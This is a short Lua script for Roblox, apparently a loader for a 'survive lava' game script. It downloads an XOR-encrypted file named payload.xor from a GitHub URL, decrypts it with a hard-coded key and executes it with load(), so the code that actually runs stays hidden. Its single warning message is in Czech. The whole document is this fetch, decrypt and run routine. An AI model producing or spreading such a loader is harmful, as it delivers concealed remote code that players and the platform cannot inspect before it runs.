local key = "aVysHSYBTqIuFaQW"

local function decrypt(data, key)
    local res = {}
    for i = 1, #data do
        local k = key:byte((i-1) % #key + 1)
        local c = data:byte(i)
        res[i] = string.char(bit32.band(bit32.bxor(c, k), 0xFF))
    end
    return table.concat(res)
end

local url = "https://raw.githubusercontent.com/janhub1/scriptsurvivelava1/main/payload.xor"

local Http = game:GetService("HttpService")
local success, encrypted = pcall(Http.GetAsync, Http, url)

if not success then
    warn("Nepodařilo se stáhnout payload: " .. tostring(encrypted))
    return
end

local decoded = decrypt(encrypted, key)
load(decoded)()
